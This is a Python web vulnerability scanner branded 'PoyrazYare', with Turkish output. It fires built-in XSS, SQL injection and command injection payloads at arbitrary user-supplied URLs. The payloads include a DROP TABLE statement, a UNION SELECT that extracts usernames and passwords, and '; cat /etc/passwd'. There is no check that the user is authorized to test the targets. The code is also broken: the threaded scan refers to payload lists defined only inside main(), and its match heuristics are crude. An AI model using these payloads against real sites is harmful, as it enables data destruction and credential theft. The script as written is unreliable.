import requests
import time
import json
import threading

def scan_for_xss(url, payloads):
    found_xss = []
    print(f"\n{url} için PoyrazYare XSS Açıkları taranıyor...")
    
    for payload in payloads:
        try:
            response = requests.get(url + payload)
            if payload in response.text:
                print(f"PoyrazYare XSS Açığı Bulundu! Payload: {payload}")
                found_xss.append(payload)
        except requests.exceptions.RequestException as e:
            print(f"Hata: {e}")

    if not found_xss:
        print("PoyrazYare XSS açığı bulunamadı.")
    
    return found_xss

def scan_for_sql_injection(url, payloads):
    found_sql_injection = []
    print(f"\n{url} için PoyrazYare SQL Enjeksiyon Açıkları taranıyor...")
    
    for payload in payloads:
        try:
            response = requests.get(url + payload)
            if "error" in response.text.lower() or "mysql" in response.text.lower():
                print(f"PoyrazYare SQL Enjeksiyon Açığı Bulundu! Payload: {payload}")
                found_sql_injection.append(payload)
        except requests.exceptions.RequestException as e:
            print(f"Hata: {e}")

    if not found_sql_injection:
        print("PoyrazYare SQL enjeksiyon açığı bulunamadı.")
    
    return found_sql_injection

def scan_for_command_injection(url, payloads):
    found_command_injection = []
    print(f"\n{url} için PoyrazYare Komut Enjeksiyonu Açıkları taranıyor...")
    
    for payload in payloads:
        try:
            response = requests.get(url + payload)
            if "bash" in response.text.lower() or "command" in response.text.lower():
                print(f"PoyrazYare Komut Enjeksiyonu Açığı Bulundu! Payload: {payload}")
                found_command_injection.append(payload)
        except requests.exceptions.RequestException as e:
            print(f"Hata: {e}")

    if not found_command_injection:
        print("PoyrazYare komut enjeksiyonu açığı bulunamadı.")
    
    return found_command_injection

def save_results(results, url):
    with open("vulnerability_results.json", "a") as f:
        json.dump({url: results}, f, indent=4)
        f.write("\n")

    print("Sonuçlar 'vulnerability_results.json' dosyasına kaydedildi.")

def threaded_scan(url):
    xss_results = scan_for_xss(url, default_xss_payloads)
    sql_results = scan_for_sql_injection(url, default_sql_payloads)
    command_injection_results = scan_for_command_injection(url, default_command_payloads)
    
    save_results({'xss': xss_results, 'sql': sql_results, 'command_injection': command_injection_results}, url)

def main():
    urls = input("PoyrazYare ile taramak istediğiniz URL'leri girin (virgülle ayırarak): ").split(',')
    urls = [url.strip() for url in urls]
    
    default_xss_payloads = [
        "<script>alert('XSS')</script>",
        "';alert('XSS');//",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')></iframe>"
    ]

    default_sql_payloads = [
        "' OR '1'='1' --",
        "' OR '1'='2' --",
        "admin' --",
        "' UNION SELECT NULL, username, password FROM users --",
        "'; DROP TABLE users; --"
    ]

    default_command_payloads = [
        "; ls",
        "; whoami",
        "; cat /etc/passwd"
    ]

    threads = []
    for url in urls:
        thread = threading.Thread(target=threaded_scan, args=(url,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
